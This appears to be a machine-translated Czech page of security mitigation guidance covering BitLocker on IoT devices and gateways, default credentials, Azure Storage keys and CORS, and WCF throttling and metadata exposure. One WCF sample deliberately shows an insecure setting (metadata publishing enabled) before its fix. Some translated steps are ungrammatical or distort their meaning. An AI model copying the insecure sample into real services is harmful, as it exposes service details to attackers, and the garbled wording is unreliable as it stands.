## <a id="partition-iot"></a>Šifrování operačního systému a další oddíly zařízení IoT s bit schránky

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Windows 10 IoT Core implementuje Odlehčená verze šifrování zařízení bit locker, který má silné závislosti na přítomnosti TPM na platformě, včetně protokolu nezbytné preOS v rozhraní UEFI, který provádí potřebné měření. Tato měření preOS zajistěte, aby operační systém později konečné záznam o tom, jak byl spuštěn operační systém. Šifrování oddíly operačního systému pomocí bit schránky a všechny další oddíly také v případě, že jsou v nich uložené žádným citlivým datům. |

## <a id="min-enable"></a>Ujistěte se, že jsou povolené jenom minimální služby/funkce na zařízeních

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **SDL fáze**               | Nasazení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Zapnout nebo vypnout všechny funkce nebo služby v operačním systému, který není nutné pro fungování řešení. Pro třeba pokud zařízení nevyžaduje uživatelského rozhraní mají být nasazeny, nainstalujte Windows IoT Core bezobslužného režimu. |

## <a id="field-bit-locker"></a>Šifrování operačního systému a další oddíly hraniční brána IoT s bit schránky

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Brána IoT pole | 
| **SDL fáze**               | Nasazení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Windows 10 IoT Core implementuje Odlehčená verze šifrování zařízení bit locker, který má silné závislosti na přítomnosti TPM na platformě, včetně protokolu nezbytné preOS v rozhraní UEFI, který provádí potřebné měření. Tato měření preOS zajistěte, aby operační systém později konečné záznam o tom, jak byl spuštěn operační systém. Šifrování oddíly operačního systému pomocí bit schránky a všechny další oddíly také v případě, že jsou v nich uložené žádným citlivým datům. |

## <a id="default-change"></a>Ujistěte se, že výchozí přihlašovací údaje ze brána pole se změní při instalaci

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Brána IoT pole | 
| **SDL fáze**               | Nasazení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Ujistěte se, že výchozí přihlašovací údaje ze brána pole se změní při instalaci |

## <a id="cloud-firmware"></a>Ujistěte se, že Cloudová brána implementuje proces aktualizovat firmware připojená zařízení

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Brána IoT cloudu | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | Výběr brány - Azure IoT Hub |
| **Odkazy**              | [Přehled správy zařízení IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [k aktualizaci firmwaru zařízení](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **Kroky** | LWM2M je protokol z Open Mobile Alliance pro správu zařízení IoT. Umožňuje správu zařízení Azure IoT pro interakci s fyzických zařízení pomocí úlohy zařízení. Ujistěte se, že Cloudová brána implementuje proces pravidelně udržovat zařízení a další konfigurační data až do data pomocí správy zařízení služby Azure IoT Hub. |

## <a id="controls-policies"></a>Ujistěte se, že zařízení mají kontrolních mechanismů pro zabezpečení koncový bod nakonfigurovaný podle organizační zásady

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Hranice vztahů důvěryhodnosti počítače | 
| **SDL fáze**               | Nasazení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Ujistěte se, že zařízení mají ovládací prvky zabezpečení koncových bodů například bit schránky pro šifrování na úrovni disku, aktualizované podpisy antivirové, na základě brána firewall, upgrady operačního systému hostitele, skupiny zásad atd. jsou nakonfigurované podle zásad zabezpečení organizace. |

## <a id="secure-keys"></a>Zajistěte zabezpečenou správu přístupových klíčů k úložišti Azure

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Azure Storage | 
| **SDL fáze**               | Nasazení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Průvodci zabezpečením Azure Storage – Správa vašeho klíče účtu úložiště](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Kroky** | <p>Úložiště klíčů: Se doporučuje ukládat přístupové klíče služby Azure Storage ve službě Azure Key Vault jako tajný klíč a mít aplikace načtení klíče z trezoru klíčů. Tato možnost se doporučuje z následujících důvodů:</p><ul><li>Aplikace nebude mít nikdy žádná úložiště klíčů pevně v konfiguračním souboru, který odebere tento způsob případného někdo získal přístup ke klíčům bez konkrétní oprávnění</li><li>Přístup ke klíčům je možné řídit pomocí Azure Active Directory. To znamená, že vlastník účtu může udělit přístup k několika málo až po aplikace, které potřebují k načtení klíčů ze služby Azure Key Vault. Jiné aplikace nebudou moct bez nutnosti přidělit jim konkrétně oprávnění pro přístup</li><li>Obnovování klíčů: Doporučujeme mít zavedené opětovné vygenerování přístupových klíčů k úložišti Azure z bezpečnostních důvodů. Podrobnosti o důvod, proč a jak plánovat opětovném generování přístupového klíče jsou popsané v článku o Průvodci zabezpečením Azure Storage</li></ul>|

## <a id="cors-storage"></a>Ujistěte se, že jsou povolena pouze důvěryhodného zdroje, pokud je povolené CORS v Azure storage

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Azure Storage | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Podpora CORS pro služby Azure Storage](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Kroky** | Azure Storage umožňuje povolit CORS – mezi sdílení zdrojů původu. Pro každý účet úložiště můžete zadat domén, které mají přístup k prostředkům v účtu úložiště. CORS je ve výchozím nastavení zakázána ke všem službám. CORS můžete povolit pomocí rozhraní REST API nebo klientskou knihovnu pro úložiště pro volání metod pro nastavení zásad služby. |

## <a id="throttling"></a>Povolení služby WCF pro omezení funkce

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | WCF | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Rozhraní .NET framework 3 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [obohacení království](https://vulncat.fortify.com) |
| **Kroky** | <p>Nejsou uvedení omezení týkající se použití systémových prostředků může vést k vyčerpání prostředků a nakonec i útok DoS.</p><ul><li>**Vysvětlení:** Windows Communication Foundation (WCF) nabízí možnost omezování žádostí o služby. Povolení příliš mnoho požadavků klientů můžete při zaplaví systém a vyčerpání její prostředky. Na druhé straně, umožňuje pouze malý počet požadavků na službu může oprávněným uživatelům zabránit používání služby. Každá služba by měla jednotlivě vyladěné tak, aby a nakonfigurované tak, aby odpovídající množství prostředků.</li><li>**DOPORUČENÍ** povolit WCF funkce omezování služby a nastavení omezení vhodných pro vaši aplikaci.</li></ul>|

### <a name="example"></a>Příklad:
Tady je příklad konfigurace s povoleno omezení:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF informacím pomocí metadat

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | WCF | 
| **SDL fáze**               | Sestavení |  
| **Použitelných technologiích** | Rozhraní .NET framework 3 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [obohacení království](https://vulncat.fortify.com) |
| **Kroky** | Metadata může pomoct útočníci plán forma útoku a další informace o systému. Služby WCF můžete nakonfigurovat ke zveřejnění metadat. Metadata poskytuje podrobný popis služby a by neměl být všesměrového vysílání v produkčním prostředí. `HttpGetEnabled`  /  `HttpsGetEnabled` Vlastnosti třídy ServiceMetaData definuje, zda služba bude vystavovat metadata | 

### <a name="example"></a>Příklad:
Kód uvedený níže dá pokyn k vysílání metadata služby WCF
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Vysílání není metadata služby v produkčním prostředí. Nastavte HttpGetEnabled / HttpsGetEnabled vlastnosti ServiceMetaData tříd na hodnotu false. 

### <a name="example"></a>Příklad:
Následující kód nastaví WCF není vysílat metadat služby. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
